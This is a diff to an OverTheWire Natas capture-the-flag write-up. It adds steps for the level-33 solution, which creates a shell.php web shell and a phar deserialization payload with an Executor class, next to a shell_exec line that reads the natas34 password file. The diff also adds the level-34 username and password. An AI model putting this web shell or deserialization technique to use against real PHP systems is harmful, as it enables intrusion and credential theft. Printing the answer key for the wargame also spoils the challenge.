@@ -1768,6 +1768,10 @@ Step 3: Then click view source code, it's a php script
 
 ![image](./images-1/image-33-1.png)
 
+Step 4: we need create files, 1.natas33.php, 2.shell.php, 
+
+Step 5: So, we will Write a code like this, In nano editor, Then save the file, Then . Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
 
 
 <?php 
@@ -1786,7 +1790,7 @@ echo shell_exec('cat /etc/natas_webpass/natas34');
 <?php
 class Executor
 {
-    private $fiilename = "shell.php";
+    private $filename = "shell.php";
     private $signature = True;
     private $init = False;
 }
@@ -1809,9 +1813,11 @@ $phar->stopBuffering();
 
 
 
-
-
-
+## Level-34
++ Username : natas34
++  Password :  j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
++ Domain : http://natas34.natas.labs.overthewire.org
+## Explanation
 
 
 
